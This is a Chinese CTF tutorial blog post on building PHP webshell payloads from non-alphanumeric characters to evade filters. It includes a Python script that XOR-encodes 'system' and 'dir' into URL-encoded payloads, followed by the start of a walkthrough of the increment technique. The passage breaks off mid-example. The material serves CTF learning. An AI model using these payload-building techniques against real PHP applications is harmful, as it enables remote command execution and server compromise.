# 前言
在CTFShow的每周挑战中遇到了PHP无数字字母构造webshell的一系列题目，做了做发现我这个菜鸡不怎么会，所以对此类知识进行一个简单总结，希望能对正在学习的师傅有所帮助。
# 构造语句的几种方式
首先来看一下最原始的题
此时的话只是ban了数字和字母，然后这个时候的话想要构造webshell就需要用其他字符了，然后我们这里的话可以用位运算符中的取反、自增来做这个。
## 异或
这里需要先讲一点基础知识。  
什么是异或，我们这里举一个例子，我们将字符`A`和`?`进行异或操作
但是这种方式如果自己去慢慢找的话，过程是极为缓慢的，想到我们异或一次不仅能构造出一个字符，也可以一次构造出多个字符，比如`('AB')^('11')`  
此时就可以得到`qs`字符串，那我们这里是不是就可以构造一个脚本，通过一次异或运算得到我们想构造的字符串，比如`system`，那这里的话我们大体思路的话就有了
    第一步：寻找未被过滤的字符
    第二步：写入我们想构造的字符串，然后对它进行一个遍历，先获取第一个字符
    第三步：用刚刚找到的未被过滤的字符进行一个遍历，看哪两个能够通过异或运算构造出第一个字符，同理得到后面的
    第四步：输出时将字符进行一个URL编码，因为涉及到了部分不可见字符
这里想到之前在CTFShow命令执行系列中用过一个脚本与此类似，这里简单修改一下脚本，就可以达到我们想要的效果了，脚本如下
    import re
    import requests
    import urllib
    from sys import *
    import os
    a=[]
    ans1="" 
    ans2=""
    for i in range(0,256): #设置i的范围
        c=chr(i)
        #将i转换成ascii对应的字符，并赋值给c
        tmp = re.match(r'[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-',c,re.I)
        #设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符
        if(tmp):
            continue
            #当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可
        else:
            a.append(i)
            #在数组中增加i，这些就是未被系统过滤掉的字符
    # eval("echo($c);");
    mya="system"  #函数名 这里修改！
    myb="dir"      #参数
    def myfun(k,my): #自定义函数
        global ans1 #引用全局变量ans1，使得在局部对其进行更改时不会报错
        global ans2 #引用全局变量ans2，使得在局部对其进行更改时不会报错
        for i in range (0,len(a)): #设置循环范围为（0，a）注：a为未被过滤的字符数量 
            for j in range(i,len(a)): #在上个循环的条件下设置j的范围
                if(a[i]^a[j]==ord(my[k])):
                    ans1+=chr(a[i]) #ans1=ans1+chr(a[i])
                    ans2+=chr(a[j]) #ans2=ans2+chr(a[j])
                    return;#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符
    for x in range(0,len(mya)): #设置k的范围
        myfun(x,mya)#引用自定义的函数
    data1="('"+urllib.request.quote(ans1)+"'^'"+urllib.request.quote(ans2)+"')" #data1等于传入的命令,"+ans1+"是固定格式，这样可以得到变量对应的值，再用'包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值
    print(data1)
    ans1=""#对ans1进行重新赋值
    ans2=""#对ans2进行重新赋值
    for k in range(0,len(myb)):#设置k的范围为(0,len(myb))
        myfun(k,myb)#再次引用自定义函数
    data2="(\""+urllib.request.quote(ans1)+"\"^\""+urllib.request.quote(ans2)+"\")"
    print(data2)
接下来去尝试一下  
## 自增
官方文档如下  
当我们通过某种方法可以得到一个字符时，我们就可以通过自增来获取其他字符，比如现在我们获取到了`$_=A`，我们进行`$_++`，此时`$_`就变成了`B`，同理就可以构造出`GET`以及`POST`字符，接下来以例子来进行讲解,这里例题的话还用之前的demo
我们首先可以写一个`[]`看一下
    <?php
    $_=[];
    var_dump($_);
这个时候的话可以看到它就是一个数组，我们无法获取它的这个`Array`字符，那我们该怎么获取呢，我们尝试拼接一个数字
    <?php
    $_=[].'1';
    var_dump($_);
这里看到输出的是`Array1`，我们这里是不允许出现数字的，但我们直接拼接个空是不是也是可行的呢，尝试一下
    <?php
    $_=[].'';
    var_dump($_);
成功获取到了字符`Array`，然后我们获取想获取A的话，就可以采用`$_[0]`这种方式来获取，但我们是不能够写数字的，所以我们这里可以用一个判断,比如我们在`[]`里加一个`==$`，此时因为`空`和`$`不同，它就会输出`0`，此时也就等同于`$_[0]`，具体实现代码如下
    <?php
    $_=[];
    $_=$_[''=='$'];
    echo $_;
此时成功获取到了字符`A`，有了`A`，我们就可以通过自增依次获取其他字符，我们尝试获取一个字符`G`
    <?php
    $_=[];//Array
    $_=$_[''=='$'];//A
    $_++;//B
    $_++;//C
    $_++;//D
    $_++;//E
    $_++;//F